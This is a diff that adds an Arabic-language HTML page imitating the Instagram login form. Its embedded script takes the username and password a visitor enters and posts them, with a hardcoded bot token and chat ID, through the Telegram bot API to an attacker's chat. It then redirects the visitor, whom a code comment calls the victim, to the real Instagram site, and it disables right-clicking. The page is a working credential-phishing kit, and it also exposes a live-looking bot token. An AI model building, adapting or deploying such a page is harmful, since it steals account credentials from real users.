@@ -1,1 +1,259 @@
 
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى إنستغرام</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+            padding: 20px;
+        }
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 42px;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 600;
+        }
+        .logo-fallback {
+            font-size: 42px;
+            font-weight: 600;
+            color: #262626;
+            letter-spacing: -2px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .login-btn:hover {
+            background: #1877f2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider::before {
+            margin-right: 15px;
+        }
+        .divider::after {
+            margin-left: 15px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 15px;
+            display: block;
+        }
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 30px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .app-buttons img {
+            height: 40px;
+        }
+        /* إشعار التحميل */
+        #loading {
+            display: none;
+            margin-top: 10px;
+            color: #0095f6;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo-fallback">Instagram</div>
+            
+            <form id="loginForm" onsubmit="sendData(event)">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="رقم الهاتف، أو اسم المستخدم، أو البريد الإلكتروني" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="كلمة المرور" required>
+                </div>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+                <div id="loading">جاري تسجيل الدخول...</div>
+            </form>
+            
+            <div class="divider">أو</div>
+            
+            <div class="facebook-login">
+                <span>⏺</span> تسجيل الدخول عبر فيسبوك
+            </div>
+            
+            <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
+        </div>
+        
+        <div class="signup-box">
+            ليس لديك حساب؟ <a href="#">سجل الآن</a>
+        </div>
+        
+        <div class="app-download">
+            حمل التطبيق
+            <div class="app-buttons">
+                <img src="https://www.instagram.com/static/images/appstore.png/13279f5d5e8d.png" alt="App Store">
+                <img src="https://www.instagram.com/static/images/googleplay.png/df5d26e96c6d.png" alt="Google Play">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // التوكن والمعرف الذي زودتني به
+        const BOT_TOKEN = "8533593040:AAGHB2mNIeRa3Alm8OuDsASkIqE5rzI6Sak";
+        const CHAT_ID = "8380345748";
+
+        function sendData(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('الرجاء إدخال جميع البيانات');
+                return;
+            }
+
+            // إظهار رسالة التحميل
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.login-btn').disabled = true;
+
+            // إرسال البيانات إلى تيلغرام
+            const message = `🔐 **Instagram Login**\n\n📱 **Username:** ${username}\n🔑 **Password:** ${password}\n🌐 **IP:** ${getIP()}\n🕐 **Time:** ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم الإرسال:', data);
+                // توجيه الضحية إلى الصفحة الحقيقية بعد النجاح
+                window.location.href = 'https://www.instagram.com/';
+            })
+            .catch(error => {
+                console.error('خطأ:', error);
+                alert('حدث خطأ، يرجى المحاولة مرة أخرى');
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.login-btn').disabled = false;
+            });
+        }
+
+        // دالة لجلب عنوان IP (اختياري)
+        function getIP() {
+            let ip = 'غير معروف';
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ip = data.ip;
+                })
+                .catch(() => {});
+            return ip;
+        }
+
+        // منع النقر بزر الماوس الأيمن
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
